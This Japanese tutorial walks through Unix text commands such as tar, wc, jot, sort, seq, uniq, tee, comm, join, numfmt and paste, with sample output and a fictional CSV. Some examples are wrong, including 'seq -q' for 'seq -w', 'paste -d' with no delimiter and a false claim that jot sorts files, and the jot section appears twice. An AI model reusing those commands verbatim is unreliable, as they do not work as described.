アーカイブファイルからファイルを取り出すことを、「展開」あるいは「抽出」と呼びます。\n展開には、先ほどの「-c」オプションの代わりに「-x」オプションを使います（画面2）。また、「-z」はgzip形式用のオプションなので、圧縮されていない場合は「-z」オプションなしで、bzip2形式（拡張子は「.tar.bz2」）の場合は「-j」オプションを使用します。\n$ tar -zxvf archive.tgz ヒント 圧縮は Create（作成）なので -czvf、展開はeXtaruct（伸長）で -xzvfです。 圧縮、展開ともに zvf は共通です。 wcコマンド 行数と単語数とバイト数を数える 文字数を数える 行数だけを表示する wcコマンド概要 「wc」はテキストファイルの行数や単語数（word count）、文字数を数えるコマンドです。単語は、空白や改行文字で区切られたものを数えます。\nwcコマンドの書式 wc [オプション] [ファイル……]\nwcコマンドの主なオプション オプション 意味 -c バイト数を表示する -m 文字数を表示する（マルチバイト文字に対応） -l 改行の数を表示する -w 単語数を表示する wcコマンド詳細説明 行数と単語数とバイト数を数える 「wc テキストファイル名」で、指定したテキストファイルの行数、単語数、バイト数が表示されます。複数のファイルを指定（ワイルドカード「*」も使用可）した場合は、各ファイルの結果と合計が表示されます。\n実行結果は以下のとおりです。\nbash-5.1$ wc index.md 158 211 7239 index.md bash-5.1$ 表示される値は左から\nファイルの行数 単語数 バイト数となります。\n文字数を数える バイト数ではなく、文字数を数えたい場合は「-m」オプションを使用します。\n実行結果は以下のとおりです。\n$ wc -m filename.txt 行数だけを表示する 行数だけをカウントしたい場合は、「-l」オプションを使用します。\n例えば、「find」コマンドは見つけたファイルを「1件1行」で出力するので、行数を数えることでファイルの個数を知ることができます。\nls -la コマンドでファイルの数を調べる\nbash-5.1$ ls -la | grep -v ^d | wc -l 9 bash-5.1$ ヒント grep -v ^d でディレクトリを除外しています。 ファイルの行数を調べる\n$ cat filename.txt | wc -l ヒント wc -m wc -l この２つは必須です。 jotコマンド 連番を生成する 文字列と組み合わせた連番を作成する printf のフォーマットで出力する 連番の範囲を指定して出力する 乱数を出力する jotコマンド概要 jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに seqや$RANDOM コマンドがあります。\njotコマンドの書式 jot [オプション]\njotコマンドの主なオプション オプション 意味 -w [文字列] 文字列を指定する -r 乱数を出力する jotコマンド詳細説明 連番を作る 「jot ファイル名」で、ファイルの中身を並べ替えます。\nさっそく連番を出力してみます。\nまずは10個の連番を出力します。\n$ jot 10 1 2 3 4 5 6 7 8 9 10 seqコマンドではこうなります\n$ seq 10 1 2 3 4 5 6 7 8 9 10 文字列と組み合わせた連番を作成する 文字列 abc に続けて10個の連番を作成します。\n$ jot -w abc 10 abc1 abc2 abc3 abc4 abc5 abc6 abc7 abc8 abc9 abc10 次の項でも説明しますが、seqコマンドでも同様のことができます。\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。\n$ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg では、次の項ではjotコマンドでprintfのフォーマットで出力する方法を具体的に説明します。\nprintf のフォーマットで出力する $ jot -w \u0026#39;name%03d\u0026#39; 10 name001 name002 name003 name004 name005 name006 name007 name008 name009 name010 連番の範囲を指定して出力する 5からの連番を３つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 3 5 name005 name006 name007 10からの連番を５つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 5 10 name010 name011 name012 name013 name014 bash-5.1$ 乱数を出力する 1から10までの乱数を５つ出力します。\n-r 5 は乱数を５つ出力することを示します。\n1 10 は、１から１０までの範囲でといういみとなります。\n1から100までの範囲で乱数を５つ出力すると以下の通りになります。\njot -r 5 1 100 1 6 17 91 46 print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。\n$ jot -w \u0026#39;name%03d\u0026#39; -r 5 1 10 name008 name006 name007 name001 name006 ヒント 連番を作成する場合はseq、乱数を扱う場合は $RANDOMを使う場合が多いと思いますが、jotコマンドは、seq,$RANDOMを足し合わせて、同等それ以上の実行が可能です。 sortコマンド テキストファイルを並べ替える 数値の大小で並べ替える 列を指定して並べ替える CSVデータを並べ替える sortコマンド概要 sortは、テキストファイルを「行単位で並べ替える」コマンドです。他のコマンドの実行結果を並べ替える場合にも使用できます。また、空白やカンマ区切りのデータに対し、並べ替えに使用する列を指定することも可能です。\nsortコマンドの書式 sort [オプション] [ファイル……]\nsortコマンドの主なオプション オプション 意味 -r 逆順で並べ替える -n 文字列を数値と見なして並べ替える -u 同一行は1つ目だけを出力する -k 指定 場所と並べ替え種別を指定する（「-k 2」なら2列目、「-k 2n」なら2列目を数値として並べ替える。複数指定する場合は「-k」オプションを複数回指定する） sortコマンド詳細説明 テキストファイルを並べ替える 「sort ファイル名」で、ファイルを並べ替えます。逆順で並べ替えたい場合は「sort -r ファイル名」とします。\n以下のファイルを並べ替えてみます。\nA B A B C 実行結果は以下のとおりです。\n$ cat baz.txt | sort A A B B C 逆順にソートするには -r オプションを付けます。\n$ cat baz.txt | sort -r C B B A A 数値の大小で並べ替える sortコマンドのデフォルトでは、数字も文字と同じように並べ替えられます。例えば、「1」と「11」と「100」では、「1」→「100」→「11」の順番になります。これを数値として「1」→「11」→「100」の順で並べ替えるには、「-n」オプションを使用します。\nseqコマンドで１から１０までを出力します。\n$ seq 10 1 2 3 4 5 6 7 8 9 10 では普通に並べ替えてみます。\n$ seq 10 | sort 1 10 2 3 4 5 6 7 8 9 1の次に10が来てしまいました。文字を扱う並べ方でソートをしているからです。数値は数値を扱うことをsortコマンドに教えて上げる必要があります。 -n コマンドをつけます。n は numberのことです。\n$ seq 10 | sort -n 1 2 3 4 5 6 7 8 9 10 列を指定して並べ替える 「-k」オプションを使うと、並べ替えに使用する「列」を指定できます。例えば、duコマンドの結果の2番目の列、つまり「ディレクトリ名」で並べ替えるには、「du -s * | sort -k 2」のように指定します。さらに、2番目の列で逆順に並べ替えるならば、「du -s * | sort -k 2r」と指定します。\nまずは以下のファイルを作成します。\n2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite まずは最初のフィルド（ファイルサイズ）で並べ替えてみます。\n$ cat du.txt | sort 0\tFavorite 10141664\tDocuments 1519968\tCalibre Library 24\tDownloads 24631656\tDesktop 2912\tApplications 872\tDropbox -n オプションを付けるのを忘れてしまいました。\n次は -n オプションをつけて実行します。\n$ cat du.txt | sort -n 0\tFavorite 24\tDownloads 872\tDropbox 2912\tApplications 1519968\tCalibre Library 10141664\tDocuments 24631656\tDesktop 次は、２番目の列（ディレクトリ名）で並べ替えを行います。\n$ cat du.txt | sort -k2 2912\tApplications 1519968\tCalibre Library 24631656\tDesktop 10141664\tDocuments 24\tDownloads 872\tDropbox 0\tFavorite ヒント sortコマンドはものすごく良く使います。たくさんのオプションがありますが、まずはここで紹介したオプションを覚えればほぼ問題はありません。必要になったらGoogleで検索してください。 CSVデータを並べ替える 「-k」オプションでは、空白文字を区切りとして、並べ替えに使う列を指定することができます。区切り文字を変更したい場合は、「-t」オプションで使用する文字を指定します。\n例えば、CSV（comma-separated values）データの場合、区切り文字は「,（カンマ）」なので「-t ,」または「-t \u0026ldquo;,\u0026quot;」のように指定します。\nなお、3番目の列の値を数値として並べ替える場合は「-k 3n」、数値としてさらに逆順で並べ替えるなら「-k 3nr」のように指定します。\n列は以下のとおりです。\n連番,氏名,氏名（カタカナ）,性別,年齢,取得ポイント\n$ cat test.csv 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sortコマンドでCSVデータを扱う場合は -t オプションを使います。\nカンマ区切りの場合は -t, となります。\n年齢で並べ替えてみます。\n$ cat data.txt | sort -t, -nr -k5 8,白木俊史,シラキトシフミ,男,57,245 3,本郷末治,ホンゴウスエジ,男,56,252 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 7,児島愛子,コジマアイコ,女,39,675 2,吉野里紗,ヨシノリサ,女,38,894 6,塩谷貢,シオタニミツグ,男,34,494 1,小出里歩,オデリホ,女,27,85 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 sort -t, -nr -k5\n-t, は、CSVデータの区切り文字をカンマ（,）とする\n-nr の、nは並べ替えのデータを数値として扱う\nの、rは逆順で出力する\n-k5 は、並べ替えのキーとなる列を５列目とする\nという意味です。\nでは、６列目の取得ポイントの多く順に並べ替えてみます。\nbash-5.1$ cat data.txt | sort -t, -nr -k6 9,飯塚遥佳,イイヅカハルカ,女,20,974 2,吉野里紗,ヨシノリサ,女,38,894 7,児島愛子,コジマアイコ,女,39,675 4,谷村千代乃,タニムラチヨノ,女,44,556 6,塩谷貢,シオタニミツグ,男,34,494 3,本郷末治,ホンゴウスエジ,男,56,252 8,白木俊史,シラキトシフミ,男,57,245 5,内野響子,ウチノキョウコ,女,44,170 10,阿久津清蔵,アクツセイゾウ,男,9,120 1,小出里歩,オデリホ,女,27,85 ヒント csvデータのカンマ区切りは見にくいですね。 工夫してタブ区切りに変換して出力してみてください。 $ cat data.txt | sort -t, -nr -k6 | tr \u0026#34;,\u0026#34; \u0026#34;\\t\u0026#34; 9\t飯塚遥佳\tイイヅカハルカ\t女\t20\t974 2\t吉野里紗\tヨシノリサ\t女\t38\t894 7\t児島愛子\tコジマアイコ\t女\t39\t675 4\t谷村千代乃\tタニムラチヨノ\t女\t44\t556 6\t塩谷貢\tシオタニミツグ\t男\t34\t494 3\t本郷末治\tホンゴウスエジ\t男\t56\t252 8\t白木俊史\tシラキトシフミ\t男\t57\t245 5\t内野響子\tウチノキョウコ\t女\t44\t170 10\t阿久津清蔵\tアクツセイゾウ\t男\t9\t120 1\t小出里歩\tオデリホ\t女\t27\t85 ヒント ちょっと見やすくなりました（^^; revコマンド ファイルの各行を反転させる キーボードから入力した内容を反転させる revコマンド概要 reverseの語源を持つ「rev」は、ファイルの各行を末尾から行頭に向かって文字列を反転させ出力します。\nrevコマンドの書式 rev ファイル名\nrevコマンドの主なオプション オプション 意味 オプションはありません。\nrevコマンド詳細説明 ファイルの各行を反転させる $ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | rev 58,72,女,ホリデオ,歩里出小,1 498,83,女,サリノシヨ,紗里野吉,2 252,65,男,ジエスウゴンホ,治末郷本,3 655,44,女,ノヨチラムニタ,乃代千村谷,4 071,44,女,コウョキノチウ,子響野内,5 494,43,男,グツミニタオシ,貢谷塩,6 576,93,女,コイアマジコ,子愛島児,7 542,75,男,ミフシトキラシ,史俊木白,8 479,02,女,カルハカヅイイ,佳遥塚飯,9 021,9,男,ウゾイセツクア,蔵清津久阿,01 ヒント どんなときに使うのでしょうね。むしろ、どう使うのかというよりも、必要になったときに思い出すと激しく便利、といったトリッキーなコマンドのようです。tacとrevはセットで覚えておきましょう。 seqコマンド 連続番号を出力する 開始の数と間隔を指定する 数字を逆順で出力する 書式を指定して出力する seqコマンド概要 sequenceの語源を持つ「seq」は連続番号の他、一定間隔置きに数字の列を出力する順列番号出力コマンドです。\nseqコマンドの書式 seq [オプション] [開始の数 [増分]] 終了の数\nseqコマンドの主なオプション オプション 意味 -w 先頭を0で埋めて、数字の幅を等しくする -f 書式 数字の書式を指定する -s 文字列 数字の区切りに使う文字列を指定する seqコマンド詳細説明 連続番号を出力する 一般的なseqコマンドの利用例として、 seq 10は、1から10までを出力します。\n１から指定した数までの連続番号を出力する\n$ seq 10 1 2 3 4 5 6 7 8 9 10 出力される数字の桁を併せたい場合はよくあります。\n例えば、二桁で表示させたい場合に、2ではなく02、3ではなく03といった出力です。\nこの場合は「-w」オプションを使用して桁を揃えることができます。例えば seq -w 10 の場合、幅が最大なのは「10」ですから、01、02と2桁で出力されます。\n先頭を0で埋めて桁数をそろえて出力する\n$ seq -q 10 01 02 03 04 05 06 07 08 09 10 開始の数と間隔を指定する 開始の数を指定する場合は seq 5 15 のように、「seq 開始の数 終了の数」と指定します。\nseq 5 （1から5までの数を出力する）\n$ seq 5 1 2 3 4 5 開始位置を指定することもできます。たとえば以下のように、5から始まり15までの順列を出力したい場合は以下のとおりです。\nseq 5 15 （5から15までの数を出力する）\n$ 5 15 5 6 7 8 9 10 11 12 13 14 15 seq 5 2 15 のように、開始と終了の間に増分を指定することもできます。\nseq 5 2 15 （5から15まで、数を2ずつ増やしながら出力する）\n$ seq 5 2 10 5 7 9 数字を逆順で出力する 増分には実数や負の数を指定できます。従って、増分を「-1」と指定することで、数を逆順に出力することが可能です。この場合、開始と終了の数を指定する必要がある点に注意してください。\nseq 5 -1 1 （5から1までの数を出力する）\n$ seq 5 -1 1 5 4 3 2 1 増分を「-1」と指定した場合と同じ効果を、別のコマンドを用いて実現できます。入力を行単位で逆順に出力する「tac」コマンドです。\nseq 5 | tac （seqで1から5を出力し、tacコマンドで逆順に並び替えている）\n$ seq 5 | tac 5 4 3 2 1 書式を指定して出力する 「-f」オプションを用いて数字の書式を指定することができます。\n「%g」を利用することで、整数で出力する際の桁数を指定できます。例えば、4桁の幅であれば「%4g」、4桁で「0001」のようにゼロで埋めるならば「%04g」のようにします。\nseq -f 書式 3 （1から3までの数値を指定した書式で出力する）\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 $ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg ヒント 次はtacコマンドについて説明します。 tacコマンド ファイルを最終行から逆順に出力する tacコマンド概要 catコマンドを逆から読んだ「tac」はファイルの最終行から、行単位に逆順に出力するコマンドです。知る人ぞ知るマニア向けコマンドの一つです。\ntacコマンドの書式 tac [オプション] ファイル名\ntacコマンドの主なオプション オプション 意味 特筆するべきオプションはありません。\ntacコマンド詳細説明 ファイルを最終行から逆順に出力する 「tac ファイル名」で、指定したファイルを最終行から逆順に出力します\n$ cat data.txt 1,小出里歩,オデリホ,女,27,85 2,吉野里紗,ヨシノリサ,女,38,894 3,本郷末治,ホンゴウスエジ,男,56,252 4,谷村千代乃,タニムラチヨノ,女,44,556 5,内野響子,ウチノキョウコ,女,44,170 6,塩谷貢,シオタニミツグ,男,34,494 7,児島愛子,コジマアイコ,女,39,675 8,白木俊史,シラキトシフミ,男,57,245 9,飯塚遥佳,イイヅカハルカ,女,20,974 10,阿久津清蔵,アクツセイゾウ,男,9,120 実行結果は以下のとおりです。\n$ cat data.txt | tac 10,阿久津清蔵,アクツセイゾウ,男,9,120 9,飯塚遥佳,イイヅカハルカ,女,20,974 8,白木俊史,シラキトシフミ,男,57,245 7,児島愛子,コジマアイコ,女,39,675 6,塩谷貢,シオタニミツグ,男,34,494 5,内野響子,ウチノキョウコ,女,44,170 4,谷村千代乃,タニムラチヨノ,女,44,556 3,本郷末治,ホンゴウスエジ,男,56,252 2,吉野里紗,ヨシノリサ,女,38,894 1,小出里歩,オデリホ,女,27,85 ヒント catの反転がtac。よく考えたものです。恐れ入りました。 次はrevコマンドについて説明します。 uniqコマンド 重複している行を削除する 大文字／小文字を区別しないで重複行を削除する 重複している行をカウントする uniqコマンド概要 uniqコマンドは、ファイル内の重複している行を扱うコマンドです。具体的には重複している行を除去して表示したり、重複回数を表示したりできます。\nヒント uniqコマンドを実行する前にsortコマンドで並べ替えておく必要があります。 uniqコマンドの書式 uniq [オプション] 入力ファイル [出力ファイル]\nuniqコマンドの主なオプション オプション 意味 -i 比較時に大文字と小文字の違いを無視する -c 各行の前に出現回数を出力する uniqコマンド詳細説明 重複している行を削除する $ uniq ファイル名 で、ファイル内の重複行を取り除くことができます。注意点はあらかじめsortコマンドで並べ替えておく必要があります。\nヒント 実は sort -u というコマンドは、並べ替えつつuniqも実行するという便利なsortコマンドのオプションもあります。一般的にはsort -uを使うことが多いのですが、明示的にuniqコマンドを使うこともあります。 以下のコマンドの出力は同じです。\n$ cat fileName.txt | sort | uniq $ cat fileName.txt | sort -u 大文字／小文字を区別しないで重複行を削除する 「-i」（\u0026ndash;ignore-case）オプションを使うと、大文字／小文字を区別しないで重複する行を削除することができます。\nヒント uniqコマンドのignore-caseは-iです。同時に予め実行しておくsortコマンドもignore-caseも行う必要がありますが、こちらのオプションは -f です。紛らわしいですね。 ヒント 各コマンドのignore-case(大文字小文字を区別しない)は、以下のとおりです。 sort -f uniq -i grep -i 実行結果は以下のとおりです。\n$ cat fileName.txt | sort -f | uniq -i 重複している行をカウントする sortとuniqコマンドの組み合わせで、最も使われるオプションは-cでしょう。「-c」オプションは、重複している行をカウントします。\nアクセスログを並べ替えて表示\ncat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 最初のcatでApacheのaccess.logを出力します。\n次のsortで出力を並べ替えます。\nそしてuniq -cで、重複行の数をカウントし、行頭に頻度数を付与します。\nさらに、行頭の頻度数を数値として扱いsort -nで並べ替えます。\n最後のhead -n15コマンドで、頻度の高いアクセスを出力します。\nヒント CSSなどのファイルを除外する場合は以下のコマンドを使うと良いでしょう。 cat /var/log/httpd/access.log | grep -ive \u0026#34;GET /.*\\.\\(css\\|js\\|jpg\\|gif\\|png\\|swf\\|ico\\)\\ HTTP\u0026#34; | sort | uniq -c | sort -n | head -n15 teeコマンド ファイルへのリダイレクトとパイプを同時に行う 出力するファイルは都度新規作成ではなく追記する teeコマンド概要 teeコマンドは、標準入力から受け取った出力を、標準出力へ出力しつつ、同時にファイルに書き出すコマンドです。\nteeコマンドの書式 コマンド | tee ファイル | コマンド2\nコマンド | tee ファイル1 ファイル2 ファイル3……\nteeコマンドの主なオプション オプション 意味 -a 指定したファイルが既に存在する場合、新規にファイルを作成せずにすでに存在するファイルに追加する（リダイレクトの「\u0026raquo;」に相当） teeコマンド詳細説明 ファイルへのリダイレクトとパイプを同時に行う 以下のコマンドは、画面に出力をしつつ、同じ内容を output.txtに出力しています。\n$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee output.txt 出力するファイルは都度新規作成ではなく追記する teeコマンドは指定されたファイルを新規作成して出力内容をファイルに書き出します。-a オプションを付けることによって、append（追記）することができます。\noutput.txtに出力を追記する\n# 予めファイルを生成しておく $ :\u0026gt;output.txt $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt # 時間をおいて再度実行すると追記される $ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt ヒント teeコマンドの -aオプションは非常によく使います。 teeコマンドの出力をファイル書き出す場合、デフォルトは「\u0026gt;」と同等の処理で、-aオプションを付けることによって「\u0026raquo;」と同様に処理となります。 注意 「\u0026raquo;」も同様に tee -aの場合は、予めファイルを作成しておき、そのファイルに対して「\u0026raquo;」やtee -aを行います。追記する最初の処理段階でファイルが存在していることを明示的に書いておくことが重要です。 以下のまとめのように、追記する前に上書きする処理をしておく場合は、あらかじめファイルの生成をする必要はありませんが、明示的に「 $ :\u0026gt; filename 」のようにファイルを生成しておくと、ソースがわかりやすくなります。 まとめ\nechoだと以下のとおりです。ファイルには出力されるが、画面には処理内容が出力されないのでいまいち不便。\n# 上書き $ echo \u0026#34;文字列\u0026#34; \u0026gt; fileName # 追記 $ echo \u0026#34;文字列\u0026#34; \u0026gt;\u0026gt; fileName そこで、処理の出力内容が画面にも表示されるようteeを使う\n# 上書き $ echo \u0026#34;文字列\u0026#34; | tee fileName # 追記 $ echo \u0026#34;文字列\u0026#34; | tee -a fileName columnコマンド 「column」はテキストを、複数の列（column）に整形するコマンドです。\n区切り文字を指定して表形式で表示する 普通のカンマ区切りのcsvファイル\n$ cat hoge.csv bar00,bar01,bar02,bar03,bar04 bar05,bar06,bar07,bar08,bar09 上記csvファイルを、columnコマンドで見やすくします。\nオプション -s で区切り文字をカンマ(,)に指定し、\nオプション -t を利用し区切り文字(,)をTABに置き換えます。\n$ column -t -s, hoge.csv bar00 bar01 bar02 bar03 bar04 bar05 bar06 bar07 bar08 bar09 commコマンド commコマンドは、テキストファイルを比較するコマンドです。\ncomm ファイル1 ファイル2 で2つのテキストファイルを比較し、ファイル1だけにある行、ファイル2だけにある行、共通している行を出力します。\n比較するファイルはソートされている必要があります。\nヒント 比較するファイルはソートされている必要があるんです！ 使い方 まずは１つ目のファイル\n$ cat words.txt Apple Banana Orange India US Canada そして２つ目のファイル\n$ cat countries.txt India US Canada Japan $ comm \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Apple Banana Canada India Japan Orange US $ ヒント \u0026lt;と(の間は空白などを含めてはいけません。 インデントで３つの区分が見えますね。\n１つ目のインデント列は、１つ目のファイルにだけあるもの、\n２つ目のインデント列は、２つ目のファイルにだけあるもの、\n３つ目のインデント列は、両方のファイルにあるもの\nです。\n共通している行だけを表示する 「-1」「-2」「-3」オプションで、「表示しない列」を指定できます。\nオプション 説明 -1 １列目（ファイル1のみに含まれる行）を出力しない -2 ２列目（ファイル2のみに含まれる行）を出力しない -3 ３列目（両方のファイルに含まれる行）を出力しない ２列目と３列目を表示しないようにします。\n１列目だけを表示、要するに１列目にだけあるものを表示します。\n$ comm -23 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Apple Banana Orange １列目と３列目を表示しないようにします。\n２列目だけを表示、要するに２つ目のファイルにだけあるものを表示します。\n$ comm -13 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Japan $ 両方のファイルにある項目を表示 １列目と２列目を表示しないようにします。\n３列目だけを表示、要するに両方のファイルに存在するものを表示します。\n$ comm -12 \u0026lt;(sort words.txt | uniq) \u0026lt;(sort countries.txt | uniq) Canada India US $ ヒント 「-1」「-2」「-3」オプションは、「表示しない列」を指定します。 joinコマンド join は、2つのテキストファイルの内容を比較し、共通する項目がある行を連結するコマンドです。\n例えば、\n１つ目のテキストファイルに「100 apple」、\n２つ目のテキストファイルに「100 リンゴ」、\nという行があった場合、100 を共通する項目に指定することで、\n「100 apple リンゴ」と出力します。\nオプション無しの場合 join コマンドに何もオプションがない場合、2つのテキストファイルを比較し、先頭（左から数えて1番目）の項目が共通していたら結合して出力します。\n例えば、\n１つ目のテキストファイルに「100 apple」、\n２つ目のファイルには「100 リンゴ」という行があった場合は、\n先頭（左から数えて１番目）の項目を共通項目として連結し、\n「100 apple リンゴ」と出力します。\n共通項の指定 共通しているかどうかの比較に使用する項目は、join -1 および join -2 オプションで変更できます。\n例えば、１つ目のファイルでは“左から数えて３番目の項目”を使いたい場合、join -1 3 のように指定します。\n１つ目、２つ目のファイル両方で３番目の項目を使いたい場合は、join -1 3 -2 3 のように指定するか、join -j 3のように、「-j」オプションでまとめて指定することもできます。\nヒント pasteコマンドしかり、このjoinコマンドも、しらなければプログラムを書いてなんとかなる内容ではありますが、知っているといとも簡単に実現できるわけです。 jotコマンド 連番を生成する 文字列と組み合わせた連番を作成する printf のフォーマットで出力する 連番の範囲を指定して出力する 乱数を出力する jotコマンド概要 jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに seqや$RANDOM コマンドがあります。\njotコマンドの書式 jot [オプション]\njotコマンドの主なオプション オプション 意味 -w [文字列] 文字列を指定する -r 乱数を出力する jotコマンド詳細説明 連番を作る 「jot ファイル名」で、ファイルの中身を並べ替えます。\nさっそく連番を出力してみます。\nまずは10個の連番を出力します。\n$ jot 10 1 2 3 4 5 6 7 8 9 10 seqコマンドではこうなります\n$ seq 10 1 2 3 4 5 6 7 8 9 10 文字列と組み合わせた連番を作成する 文字列 abc に続けて10個の連番を作成します。\n$ jot -w abc 10 abc1 abc2 abc3 abc4 abc5 abc6 abc7 abc8 abc9 abc10 次の項でも説明しますが、seqコマンドでも同様のことができます。\n$ seq -f \u0026#34;%04g\u0026#34; 3 0001 0002 0003 seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。\n$ seq -f \u0026#34;IMG%04g.jpg\u0026#34; 3 IMG0001.jpg IMG0002.jpg IMG0003.jpg では、次の項ではjotコマンドでprintfのフォーマットで出力する方法を具体的に説明します。\nprintf のフォーマットで出力する $ jot -w \u0026#39;name%03d\u0026#39; 10 name001 name002 name003 name004 name005 name006 name007 name008 name009 name010 連番の範囲を指定して出力する 5からの連番を３つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 3 5 name005 name006 name007 10からの連番を５つ出力します。\n$ jot -w \u0026#39;name%03d\u0026#39; 5 10 name010 name011 name012 name013 name014 bash-5.1$ 乱数を出力する 1から10までの乱数を５つ出力します。\n-r 5 は乱数を５つ出力することを示します。\n1 10 は、１から１０までの範囲でといういみとなります。\n1から100までの範囲で乱数を５つ出力すると以下の通りになります。\njot -r 5 1 100 1 6 17 91 46 print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。\n$ jot -w \u0026#39;name%03d\u0026#39; -r 5 1 10 name008 name006 name007 name001 name006 numfmtコマンド numfmtコマンドは、数値の桁揃えや、金額を表示する場合の３桁区切りを簡単に実行できる便利コマンドです。\nnumfmt --format=\u0026quot;書式\u0026quot; 数値で、数値を書式に従って整形して表示します。\n使用できる書式は「%桁数f」と「%\u0026lsquo;f」です。\n例えば「\u0026ndash;format=\u0026quot;%5f\u0026rdquo;」とすると数値を5桁の幅で表示し、「\u0026ndash;format=\u0026rdquo;%\u0026lsquo;f\u0026quot;」では数値を3桁区切りで表示します。\n数値を桁ぞろえやカンマ区切りで表示する 123を5桁の幅で表示\nnumfmt \u0026ndash;format=\u0026quot;%5f\u0026quot; 123\n$ echo 10000 | numfmt --format=\u0026#34;%5f\u0026#34; 10000 $ 10000を3桁区切りで表示\nnumfmt \u0026ndash;format=\u0026quot;%\u0026lsquo;f\u0026quot; 10000\n$ echo 10000 | numfmt --format=\u0026#34;%\u0026#39;f\u0026#34;10,000 10,000 $ 10000を3桁区切りで8桁の幅で表示\nnumfmt \u0026ndash;format=\u0026quot;%\u0026lsquo;8f\u0026quot; 10000\n$ echo 10000 | numfmt --format=\u0026#34;%\u0026#39;8f\u0026#34; 10,000 $ pasteコマンド pasteコマンドは、複数のファイルを行単位で連結するコマンドです。\n$ pasteファイル1 ファイル2 で「ファイル1の1行目とファイル2の1行目」、「ファイル1の2行目とファイル2の2行目」……という行が出力されます。\nExcelに親しんでいる方は、「列のコピー」と考えると動作をイメージしやすいかもしれません。\nファイルの連結 １つ目のファイル\n$ cat emp-number.txt 100 200 300 400 500 ２つ目のファイル\n$ cat emp-firstname.txt Emma Alex Madison Sanjay Nisha ３つ目のファイル\n$ cat emp-lastname.txt Thomas Jason Randy Gupta Singh pasteコマンドで結合\n$ paste emp-number.txt emp-firstname.txt emp-lastname.txt 100 Emma Thomas 200 Alex Jason 300 Madison Randy 400 Sanjay Gupta 500 Nisha Singh ヒント すごい！ 区切り文字を指定する 区切り文字は「-d」オプションで指定します。\n例えば、カンマ（,）区切りで出力したい場合は paste -d, と指定します。\n$ paste -d emp-number.txt emp-firstname.txt emp-lastname.txt 100,Emma,Thomas 200,Alex,Jason 300,Madison,Randy 400,Sanjay,Gupta 500,Nisha,Singh ヒント すごい！！ 行列を入れ替える paste -s （\u0026ndash;serialオプション）で、行列を入れ替えて結合します。\n$ paste -s emp-number.txt emp-firstname.txt emp-lastname.txt 100\t200\t300\t400\t500 Emma Alex Madison Sanjay Nisha Thomas Jason Randy Gupta Singh $ rev コマンド すべての行の文字の順序を逆にする\n次の例に示すように、すべての行で文字の順序を逆にします。\ntac コマンドはファイルの各行を上下反転しますが、\nrev コマンドは行の各文字の前後を反転します。\n普通にcatします。\n$ cat thegeekstuff.txt 1. Linux Sysadmin, Scripting etc., 2. Databases Oracle, mySQL etc., 3. Hardware 4. Security (Firewall, Network, Online Security etc) 5. Storage 6. Cool gadgets and websites 7. Productivity (Too many technologies to explore, not much time available) 8. Website Design 9. Software Development 10. Windows Sysadmin, reboot etc., 11. Adding 1\u0026#39;s and 0\u0026#39;s revコマンドを実行した結果\n$ rev thegeekstuff.txt ,.cte gnitpircS ,nimdasyS xuniL .1 ,.cte LQSym ,elcarO sesabataD .2 erawdraH .3 )cte ytiruceS enilnO ,krowteN ,llaweriF( ytiruceS .4 egarotS .5 setisbew dna stegdag looC .6 )elbaliava emit hcum ton ,erolpxe ot seigolonhcet ynam ooT( ytivitcudorP .7 ngiseD etisbeW .8 tnempoleveD erawtfoS .9 ,.cte toober ,nimdasyS swodniW .01 s\u0026#39;0 dna s\u0026#39;1 gniddA .11 「rev」は「cat」と同じく先頭行から順番に表示しますが、表示する文字の並びが行の末尾から逆に並び替えて表示を行います。\nヒント 「rev」は「reverse」の略です。 find の出力結果を拡張子でソート 「rev」コマンドの活用場面を思い浮かべることはできませんでしたが、下記の様にすることで findで検索した結果のファイルを拡張子単位でソートをすることができます。\n$ find . -type f | rev | sort | rev 実行結果\n./file1.c ./dir/file2.c ./dir2file3.c ./header1.h ./header2.h 